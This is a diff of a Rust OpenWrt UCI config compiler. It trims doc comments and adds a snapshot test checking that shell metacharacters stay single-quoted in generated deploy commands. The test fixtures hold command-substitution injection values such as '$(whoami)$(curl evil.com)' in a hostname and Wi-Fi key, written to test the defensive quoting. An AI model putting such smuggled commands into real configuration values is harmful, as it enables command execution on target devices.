@@ -10,12 +10,10 @@ use std::path::Path;
 pub struct CompiledConfig {
     /// UCI operations (typed sections, rawUci) only — no package-manager commands.
     pub uci_batch: String,
-    /// Package-manager operations (feeds, install, remove) — rendered after the
-    /// UCI "apply done" sentinel so the rollback watchdog can't fire mid-install.
+    /// Package operations, rendered after the UCI "apply done" sentinel.
     pub package_commands: String,
     pub resolved_root: crate::config::models::Root,
-    /// Decrypted secret values. The plaintext map is private inside
-    /// [`SecretMap`]; read a single value via `secrets.get(name)`.
+    /// Decrypted secrets; read one value via `secrets.get(name)`.
     pub secrets: SecretMap,
 }
 
@@ -28,9 +26,7 @@ impl std::fmt::Debug for CompiledConfig {
     }
 }
 
-/// Declared `packageManager` hint plus whether the config actually emits any
-/// package-manager commands (packages or package sources declared). Used to decide
-/// whether runtime capability discovery is required before compiling.
+/// Declared backend plus whether package commands are emitted at all.
 pub struct PackageHint {
     pub declared: String,
     pub needs_pm: bool,
@@ -199,10 +195,7 @@ mod tests {
         );
     }
 
-    /// Audit TODO 1.3 follow-up: rawUci lines are emitted verbatim into the
-    /// deploy script. The shell-metacharacter guard used to run only on the
-    /// pre-interpolation text, so a secret substituted into a rawUci line
-    /// could smuggle in `;` / `$(...)` and execute on the target.
+    /// A secret substituted into a rawUci line must not smuggle in shell metacharacters.
     #[test]
     fn raw_uci_secret_cannot_inject_shell_metacharacters() {
         let secrets_dir = tempfile::tempdir().unwrap();
@@ -246,9 +239,7 @@ mod tests {
         );
     }
 
-    /// A NUL byte in a value is silently deleted by the shell transport, so the
-    /// config would land with a *different* value and the deploy would still
-    /// report success. It must be rejected at compile time.
+    /// A NUL byte is silently deleted by the transport, landing a wrong value.
     #[test]
     fn option_value_with_nul_byte_is_rejected() {
         let json = write_json(
@@ -265,9 +256,7 @@ mod tests {
         );
     }
 
-    /// A newline in a value is split by the generator's per-line emission,
-    /// corrupting the value (`a\nb` becomes `a\nuci b`) while the deploy still
-    /// succeeds. It must be rejected at compile time.
+    /// A newline splits one command into two, corrupting the value.
     #[test]
     fn option_value_with_newline_is_rejected() {
         let json = write_json(
@@ -284,8 +273,7 @@ mod tests {
         );
     }
 
-    /// Values UCI genuinely accepts must keep working: spaces, UTF-8 and
-    /// shell-significant characters are all valid UCI content.
+    /// Values UCI genuinely accepts must keep working.
     #[test]
     fn option_value_with_uci_valid_specials_is_accepted() {
         let json = write_json(
@@ -306,7 +294,7 @@ mod tests {
         );
     }
 
-    /// A list element with a NUL byte must be rejected too, not just scalars.
+    /// A NUL byte in a list element must be rejected too.
     #[test]
     fn list_value_with_nul_byte_is_rejected() {
         let json = write_json(
@@ -372,9 +360,7 @@ mod tests {
 
     #[test]
     fn secret_interpolation_whitelist_e2e() {
-        // Drives `@name@` resolution through compile_config using a secrets dir,
-        // proving rawUci / files.text / sshKeys are interpolated while settings
-        // and feeds already were. Verifies the whitelist end-to-end.
+        // rawUci / files.text / sshKeys interpolate alongside settings and feeds.
         let dir = tempfile::tempdir().unwrap();
         let secret_path = dir.path().join("secrets.json");
         std::fs::write(
@@ -459,14 +445,10 @@ mod tests {
     }
 }
 
-/// Compile-output regression baselines (audit plan H.1).
+/// Compile-output regression baselines.
 ///
-/// These pin the *exact* emitted `uci_batch` / `package_commands` shape for a set
-/// of fixed sample configs under `tests/samples/`. They prove the generator's
-/// behaviour is preserved across refactors (the C/F/G structural rewrites must
-/// keep every assertion below green). A snapshot only guards against accidental
-/// output change — correctness of the generated UCI is covered by the in-container
-/// round-trip tests (audit plan H.2), not by string matching here.
+/// Pin the emitted shape for the samples under `tests/samples/`. Snapshots only
+/// catch accidental changes; the in-container round-trip tests prove correctness.
 #[cfg(test)]
 mod snapshots {
     use super::*;
@@ -502,11 +484,48 @@ mod snapshots {
         assert!(out.package_commands.is_empty());
     }
 
+    /// Shell metacharacters are valid UCI content, but must stay inside the
+    /// single-quoted value so the deploy script cannot execute them.
+    #[test]
+    fn snapshot_uci_metacharacters_stay_quoted() {
+        let out = compile_sample("uci-metachars.json", PkgBackend::Opkg);
+        assert!(
+            out.uci_batch
+                .contains("set system.system.hostname='OpenWrt-$(evil)'")
+        );
+        assert!(
+            out.uci_batch
+                .contains("set wireless.default_radio0.key='pa$$w0rd$(whoami)$(curl evil.com)'")
+        );
+        // Every option value must be single-quoted. The section-type assignment
+        // (`uci set system.system=system`) is a fixed identifier, not a value,
+        // so it is the only `set` line without quotes.
+        let mut checked = 0;
+        for line in out.uci_batch.lines() {
+            let Some(rest) = line.strip_prefix("uci set ") else {
+                continue;
+            };
+            let Some((path, value)) = rest.split_once('=') else {
+                continue;
+            };
+            if path == "system.system" || path == "wireless.default_radio0" {
+                continue; // section-type assignments
+            }
+            assert!(
+                value.starts_with('\'') && value.ends_with('\''),
+                "value is not single-quoted: {line}"
+            );
+            checked += 1;
+        }
+        assert!(
+            checked >= 4,
+            "expected several quoted values, got {checked}"
+        );
+    }
+
     #[test]
     fn snapshot_uci_heterogeneous_per_type_indexing() {
-        // Audit 1.1: anonymous-section indexes count per type, not across the
-        // whole array. rule/redirect/rule must yield @rule[0], @redirect[0],
-        // @rule[1] — never @redirect[1] or @rule[2].
+        // Anonymous-section indexes count per type, not across the array.
         let out = compile_sample("uci-heterogeneous.json", PkgBackend::Opkg);
         assert!(out.uci_batch.contains("add firewall rule"));
         assert!(out.uci_batch.contains("add firewall redirect"));
@@ -587,8 +606,7 @@ mod snapshots {
         let out = compile_sample("files.json", PkgBackend::Opkg);
         assert!(out.uci_batch.is_empty(), "files produce no UCI commands");
         let resolved = &out.resolved_root.files.unwrap();
-        // Text content rendered verbatim in deploy script (checked via file block in remote_script,
-        // but the resolved model must carry the original text).
+        // The resolved model carries the original text.
         match &resolved[0].content {
             crate::config::models::FileContent::Text(t) => assert_eq!(t, "hello world"),
             _ => panic!("expected text content"),
